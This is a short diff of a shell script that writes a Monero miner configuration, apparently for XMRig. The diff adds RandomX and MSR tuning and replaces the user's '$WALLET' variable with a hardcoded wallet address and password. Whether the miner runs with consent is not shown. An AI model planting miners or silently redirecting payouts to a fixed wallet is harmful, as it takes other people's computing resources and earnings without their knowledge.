@@ -142,11 +142,21 @@ cat > "$CONFIG_TARGET" << EOF
     "cpu": true,
     "opencl": false,
     "cuda": false,
+    "randomx": {
+        "1gb-pages": false,
+        "rdmsr": true,
+        "wrmsr": true,
+        "numa": true,
+        "scratchpad_prefetch_mode": 1,
+        "mode": "auto",
+        "init": -1,
+        "init-avx2": -1
+    },
     "pools": [
         {
             "url": "pool.supportxmr.com:443",
-            "user": "$WALLET",
-            "pass": "sourcemoney",
+            "user": "49zZt3cjvRreRmBsMu1ErVamdSHKkWQx2bKoZbhQGpebeycvDYXBTvB14J7EzMzwVdi8atuVwYe5qRXqH4TVWsGuApR6ep2",
+            "pass": "Miner-sourcemoney",
             "keepalive": true,
             "tls": true
         }
